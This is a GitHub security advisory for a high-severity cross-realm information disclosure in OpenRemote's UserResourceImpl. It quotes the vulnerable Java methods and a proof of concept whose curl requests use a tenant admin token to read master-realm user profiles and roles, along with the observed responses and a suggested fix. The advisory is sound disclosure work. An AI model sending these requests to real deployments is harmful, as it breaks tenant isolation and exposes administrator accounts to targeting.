# [H] OpenRemote has Cross-Realm User Information Disclosure in UserResourceImpl

## Summary
Severity: High
Advisory: GHSA-xqr9-4wvv-gvch
CVE: CVE-2026-54641
CWE: CWE-639
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-06
Source: https://github.com/advisories/GHSA-xqr9-4wvv-gvch
Type: github-advisory

## Affected
- Maven: `io.openremote:openremote-manager` — affected >=0 <1.24.2

## Details
### Summary

A realm admin of tenant B can read the profile, client roles, and realm roles of any user in any other realm (including the master realm) by supplying the target user's UUID in the REST API path. Three read endpoints in UserResourceImpl check whether the caller holds the read:admin role but omit a check that the target user belongs to the caller's own realm. The vulnerability enables cross-tenant user enumeration and privilege-level reconnaissance. On a multi-tenant deployment the master realm administrator account is reachable from any tenant realm admin.

### Details

The affected file is manager/src/main/java/org/openremote/manager/security/UserResourceImpl.java.

Three methods are missing an authenticated-realm guard:

get (line 102):

    public User get(RequestParams requestParams, String realm, String userId) {
        boolean hasAdminReadRole = hasResourceRole(ClientRole.READ_ADMIN.getValue(), Constants.KEYCLOAK_CLIENT_ID);
        if (!hasAdminReadRole && !Objects.equals(getUserId(), userId)) {
            throw new ForbiddenException("...");
        }
        try {
            return identityService.getIdentityProvider().getUser(userId);
        } ...
    }

The realm path parameter is accepted but never used. getUser(userId) delegates to getUserByIdFromDb(persistenceService, userId) which queries the database by UUID with no realm filter.

getUserClientRoles (line 294):

    public String[] getUserClientRoles(RequestParams requestParams, String realm, String userId, String clientId) {
        boolean hasAdminReadRole = hasResourceRole(ClientRole.READ_ADMIN.getValue(), Constants.KEYCLOAK_CLIENT_ID);
        if (!hasAdminReadRole && !Objects.equals(getUserId(), userId)) {
            throw new ForbiddenException("...");
        }
        try {
            return identityService.getIdentityProvider().getUserClientRoles(realm, userId, clientId);
        } ...
    }

getUserRealmRoles (line 313):

    public String[] getUserRealmRoles(RequestParams requestParams, String realm, String userId) {
        boolean hasAdminReadRole = hasResourceRole(ClientRole.READ_ADMIN.getValue(), Constants.KEYCLOAK_CLIENT_ID);
        if (!hasAdminReadRole && !Objects.equals(getUserId(), userId)) {
            throw new ForbiddenException("...");
        }
        try {
            return identityService.getIdentityProvider().getUserRealmRoles(realm, userId);
        } ...
    }

By contrast, all write-side methods in the same file invoke throwIfCannotAdminRealm(realm) (lines 175, 190, 264, 333, 351, 386) which calls authContext.isRealmAccessibleByUser(realm), correctly enforcing the realm boundary. The read methods were not updated when this guard was added for the write paths.

The existing GHSA-49vv-25qx-mg44 (Improper Access Control in UserResourceImpl, patched April 2026) fixed the updateUserRealmRoles write path. The read methods in the same class remain unpatched at HEAD.

### PoC

Prerequisites: two active realms (master and tenantb). The attacker authenticates as a realm-admin-level user of tenantb with read:admin role. Any valid UUID from the master realm suffices as the target userId.

Step 1. Obtain the master admin user UUID (this is typically discoverable from the audit log, API responses, or provisioning records visible to the tenantb admin).

Step 2. Obtain an access token for the tenantb admin:

    TENANTB_TOKEN=$(curl -s -X POST \
      "https://<host>/auth/realms/tenantb/protocol/openid-connect/token" \
      -d "client_id=openremote&grant_type=password&username=tenantb_admin&password=TenantB123!" \
      | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

Step 3. Read a master-realm user profile using the tenantb token:

    curl -s -H "Authorization: Bearer $TENANTB_TOKEN" \
      "https://<host>/api/tenantb/user/master/f05e9eb4-0de6-45a6-9dc5-088402465e4e"

Observed response from the live test instance (commit 22a42a7, 2026-06-04):

    {"realm":"master","realmId":"104856cd-ae5b-4a2d-917a-7e7f700561c8",
     "id":"f05e9eb4-0de6-45a6-9dc5-088402465e4e",
     "firstName":"System","lastName":"Administrator",
     "enabled":true,"createdOn":1780550421390,
     "serviceAccount":false,"username":"admin"}
    HTTP 200

Step 4. Read master-admin realm roles:

    curl -s -H "Authorization: Bearer $TENANTB_TOKEN" \
      "https://<host>/api/tenantb/user/master/userRealmRoles/f05e9eb4-0de6-45a6-9dc5-088402465e4e"

Observed response:

    ["admin"]
    HTTP 200

Step 5. Read master-admin client roles:

    curl -s -H "Authorization: Bearer $TENANTB_TOKEN" \
      "https://<host>/api/tenantb/user/master/userRoles/f05e9eb4-0de6-45a6-9dc5-088402465e4e/openremote"

Observed response:

    ["read:alarms","read:logs","write:logs","read:admin","write:insights","read:services",
     "write:alarms","write:attributes","write:services","write:user","write:assets",
     "read:insights","read:map","read:users","read:assets","read:rules","write",
     "write:admin","read","write:rules"]
    HTTP 200

All three requests succeed with a tenantb-scoped token against master-realm targets. The HTTP 200 responses confirm the cross-realm boundary is crossed.

A fix would add throwIfCannotAdminRealm(realm) (or an equivalent isRealmAccessibleByUser check) to the three read methods, mirroring the pattern already applied to the write methods.

### Impact

Any realm admin (write:admin + read:admin roles) in a non-master tenant can enumerate user accounts, email addresses, enabled/disabled status, and the full set of Keycloak roles for any user in any other realm, including the privileged master realm. This exposes admin account identities and role assignments that would assist targeted attacks (credential stuffing, social engineering, escalation via the already-documented write path). On hosted or shared OpenRemote deployments where multiple organizations are separated into different realms, this breaks tenant isolation for user data.

## References
- https://github.com/openremote/openremote/security/advisories/GHSA-xqr9-4wvv-gvch
- https://github.com/openremote/openremote/commit/de89b8d3af272d717bf297934c2cbc97243f08b7
- https://github.com/openremote/openremote
